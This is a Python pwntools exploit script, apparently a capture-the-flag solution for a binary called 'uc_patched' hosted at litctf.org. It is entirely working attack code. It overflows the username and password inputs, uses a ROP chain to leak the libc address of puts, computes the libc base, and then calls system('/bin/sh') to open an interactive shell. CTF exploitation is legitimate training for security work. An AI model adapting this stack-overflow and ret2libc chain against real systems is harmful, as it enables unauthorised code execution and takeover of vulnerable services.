#!/usr/bin/env python3

from pwn import *

elf = ELF("./uc_patched")
libc = ELF('libc6_2.39-0ubuntu8.4_amd64.so')
context.binary = elf
context.terminal = ['kitty','-e']

gdbscript = '''
b*main
b*0x00000000004012b9
c
'''

if args.REMOTE:
    p = remote('litctf.org',31779)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript=gdbscript)
else:
    p = process(elf.path)

pop_rdi = 0x0000000000401323
ret = 0x000000000040101a

def leak_value():
	payload = flat (
	pop_rdi,
	elf.got['puts'],
	elf.plt['puts']
)
	return payload

payload = leak_value()


main_addr = p64(elf.sym['main'])
main_addr_spam = cyclic(64) + main_addr + cyclic(24)
password =  main_addr_spam  +b'd0nt_57r1ngs_m3_3b775884\x00'


p.recvuntil(b'Enter username:')
p.sendline( password + cyclic(128-(len(password))) +b'LITCTF\x00'+ cyclic(33)+ payload )
p.recvuntil(b'Goodbye\n')

leak = p.recvline().strip()       
leaked_puts = u64(leak.ljust(8, b'\x00'))
print(hex(leaked_puts))

print('puts lib addr',hex(libc.sym.puts))

libc.address = leaked_puts - libc.sym.puts
print(hex(libc.address))

system_addr = libc.sym.system
binsh = next(libc.search(b'/bin/sh'))

def shellcode():
    payload = flat (
    pop_rdi,
    binsh,
    system_addr
    )
    return payload



shellcode = shellcode()
p.recvuntil(b'Enter password:')
p.sendline(b'd0nt_57r1ngs_m3_3b775884\x00\nAAAAAALITCTF\x00\n'+cyclic(32)+main_addr)

main_addr_spam = cyclic(64) + main_addr + cyclic(24)
password =  main_addr_spam  +b'd0nt_57r1ngs_m3_3b775884\x00'
print(len(password))
p.recvuntil(b'Enter username:')
p.sendline( password + cyclic(128-(len(password))) +b'LITCTF\x00'+ cyclic(16) + main_addr + cyclic(9) + shellcode )

p.interactive()